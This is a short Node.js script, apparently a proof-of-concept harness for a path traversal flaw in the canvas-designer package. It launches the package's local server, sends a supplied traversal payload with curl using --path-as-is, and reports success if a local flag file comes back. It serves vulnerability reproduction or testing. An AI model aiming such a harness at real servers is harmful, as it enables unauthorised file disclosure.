const fs = require("fs");
const { sleep } = require("sleep");
const { exec } = require("child_process");

function exploitFunction(payload) {
  const path = require("path"); // Import the path module
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  let hostsFile = fs.readFileSync(pathToFlag).toString();

  const server = "node ./node_modules/canvas-designer/server.js";
  exec(server, (error, stdout) => {
    sleep.sleep(2);

    const attack_string = `curl -v --path-as-is "http://127.1.1.1:9001${payload}"`;
    exec(attack_string, (error, stdout) => {
      if (stdout === hostsFile) {
        console.log("Exploit successful!");
      } else {
        console.error("Exploit failed.");
      }
    });
  });
}

module.exports = { exploitFunction };